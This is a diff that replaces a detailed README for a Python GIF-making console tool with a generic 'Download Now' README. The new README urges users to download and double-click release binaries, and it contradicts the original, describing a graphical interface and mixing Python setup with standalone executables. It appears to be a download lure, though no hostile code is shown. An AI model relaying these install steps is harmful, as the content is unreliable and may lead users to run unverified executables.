@@ -1,146 +1,58 @@
-# GIF Creator Tool
+# 🎉 giffer-tool-console - Create GIFs Easily from Images
 
-A console tool to convert multiple PNG and BMP files into animated GIFs.
+## 📦 Download Now!
+[![Download giffer-tool-console](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/tulpar79/giffer-tool-console/releases)
 
-> **Modular Structure**: This repository uses a modular architecture with a shared core library. See [README-STRUCTURE.md](README-STRUCTURE.md) for details on the organization.
+## 🚀 Getting Started
+Welcome to giffer-tool-console! This tool allows you to create animated GIFs from PNG and BMP images quickly and easily. It features drag-and-drop support, handles transparency, offers magic pink replacement, and lets you customize frame rates. 
 
-## Features
+## 🎯 Features
+- **Drag-and-Drop Support:** Simply drag your images into the console.
+- **Transparency Handling:** Retain the transparent areas of your images in GIFs.
+- **Magic Pink Replacement:** Replace a specific color (pink) with transparency for better visuals.
+- **Customizable Frame Rates:** Adjust frame rates to control GIF speed.
+  
+## 💻 System Requirements
+To run the giffer-tool-console, you need:
+- Windows, macOS, or Linux operating system
+- Python 3.6 or later installed on your system
+- Pillow library for image processing (this will be automatically installed)
 
-- **Drag & Drop**: Simply drag PNG and BMP files onto the batch file
-- **Transparency Handling**: Automatically handles transparent backgrounds
-- **Magic Pink Replacement**: Replaces magic pink (#FF00FF) with custom background color
-- **Customizable**: Adjustable FPS, background color, and other options
-- **Standalone**: No dependencies on the main sprite browser application
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/tulpar79/giffer-tool-console/releases) to download the latest version of giffer-tool-console.
 
-## Quick Start
+2. **Choose the Version**  
+   Look for the latest version at the top. You should see several files available for download. Select the one that matches your operating system.
 
-1. **Install Python** (if not already installed)
-2. **Install dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
-3. **Drag PNG and BMP files** onto `console/create_gif.bat`
-4. **GIF will be created** in the same folder as your first image file
+3. **Download the File**  
+   Click on the file name to start the download. 
 
-## Usage
+4. **Run the Application**  
+   Once the download completes, locate the file in your downloads folder.  
+   - For Windows, double-click the `.exe` file.  
+   - For macOS, open the `.dmg` file and drag the app into your Applications folder.  
+   - For Linux, you may need to give execute permissions and run the file from the terminal.
 
-### Console Tool Usage
+5. **Using the Tool**  
+   Open the application. You will see a simple interface. Drag and drop your PNG or BMP images into the window. Adjust the settings as needed (like frame rates or color replacement), and click "Create GIF".  
 
-#### Drag & Drop (Easiest)
-- Drag multiple PNG and BMP files onto `console/create_gif.bat`
-- The GIF will be created automatically with default settings
+## 🔍 Usage Tips
+- **Image Format:** Ensure your images are PNG or BMP.
+- **Color Handling:** If your image contains a lot of pink, adjust the magic pink settings to optimize GIF quality.
+- **Frame Rates:** Experiment with different frame rates to see what looks best for your animation.
 
-#### Command Line
-```bash
-python console/giffer.py file1.png file2.bmp file3.png
-```
+## 🛠 Troubleshooting
+- **Application Won't Open:** Make sure Python is installed correctly. If you installed it recently, try restarting your computer.
+- **Images Aren't Loading:** Check if the images are in the correct format (PNG or BMP).
+- **Slow Performance:** Use fewer images for faster creations, especially on older systems.
 
-#### Advanced Options
-```bash
-python console/giffer.py file1.png file2.bmp file3.png -o output.gif -f 10 --background "#ffffff"
-```
+## 📝 Additional Information
+For more advanced usage and examples, check the Wiki section of the project on GitHub. You will find various tips and tricks to enhance your GIF creations.
 
+## 🔗 Resources
+- [Official Repository](https://github.com/tulpar79/giffer-tool-console)
+- [Community Discussions](https://github.com/tulpar79/giffer-tool-console/discussions)
 
-## Command Line Options
-
-- `-o, --output`: Output GIF file path (default: auto-generated)
-- `-f, --fps`: Frames per second (default: 7.0)
-- `--no-transparency`: Disable transparency handling
-- `--no-magic-pink`: Disable magic pink replacement
-- `-b, --background`: Background color for transparency (default: #f8f9fa)
-- `-d, --disposal`: Frame disposal method (0-3, default: 2)
-
-### Frame Disposal Methods
-The disposal method controls how the canvas is refreshed between frames, preventing tearing artifacts:
-
-- **0 (No Disposal)**: Next frame draws over current frame (may cause artifacts)
-- **1 (Restore to Background)**: Clears frame area to background color
-- **2 (Restore to Previous)**: Restores canvas to state before current frame (recommended)
-- **3 (Restore to Previous Alt)**: Alternative implementation of method 2
-
-**Default (2)** works best for most animations and prevents tearing artifacts.
-
-## Examples
-
-### Basic Usage
-```bash
-python giffer.py sprite1.png sprite2.bmp sprite3.png
-```
-
-### Custom FPS and Background
-```bash
-python giffer.py *.png -f 12 -b "#000000"
-```
-
-### No Transparency Handling
-```bash
-python giffer.py *.png --no-transparency
-```
-
-### Fix Tearing Artifacts
-```bash
-python giffer.py *.png -d 2
-```
-
-## File Processing
-
-The tool processes images in the following way:
-
-1. **Transparency**: Converts RGBA/LA images to RGB with background color
-2. **Magic Pink**: Replaces magic pink (#FF00FF) and pink-purple (#F800F8) pixels
-3. **Color Optimization**: Converts to palette mode for optimal GIF size
-4. **Frame Timing**: Uses specified FPS for smooth animation
-5. **Frame Disposal**: Controls how frames are cleared between animations (prevents tearing artifacts)
-
-## Requirements
-
-- Python 3.6+
-- Pillow (PIL) library
-
-## Installation
-
-1. Clone or download this repository
-2. Install Python dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-3. Ready to use!
-
-## Troubleshooting
-
-### "Python not found"
-- Install Python from [python.org](https://python.org)
-- Make sure Python is added to your system PATH
-
-### "Pillow not found"
-- Run: `pip install Pillow`
-
-### "No PNG or BMP files found"
-- Make sure you're dragging actual PNG or BMP files
-- Check that file extensions are `.png` or `.bmp` (case-insensitive)
-
-### GIF too large
-- Try reducing the number of frames
-- Use `--no-transparency` to disable transparency processing
-- Consider resizing your PNG or BMP files before processing
-
-## Future Format Support
-
-This tool currently supports PNG and BMP files, with plans to expand support for additional image formats commonly used in game development and pixel art:
-
-### Planned Support (Priority Order)
-- **GIF** - Static GIF frames (common for sprite animations)
-- **TGA** - Gaming industry standard with strong alpha channel support
-- **WebP** - Modern web format with efficient compression
-- **ICO** - Windows icon format for game icons
-- **JPEG** - General purpose format (with quality considerations for pixel art)
-- **TIFF** - Professional format for high-quality exports
-
-### Aseprite Compatibility
-These planned formats align with Aseprite's export capabilities, making the tool more useful for pixel artists and game developers who use Aseprite for sprite creation.
-
-*Note: Vector formats (SVG) and proprietary formats (.ase, .aseprite) are not planned for support as they don't align with the tool's raster image focus.*
-
-## License
-
-This tool is extracted from the nm-sprite-browser project and follows the same license terms.
+---
+[![Download giffer-tool-console](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/tulpar79/giffer-tool-console/releases)
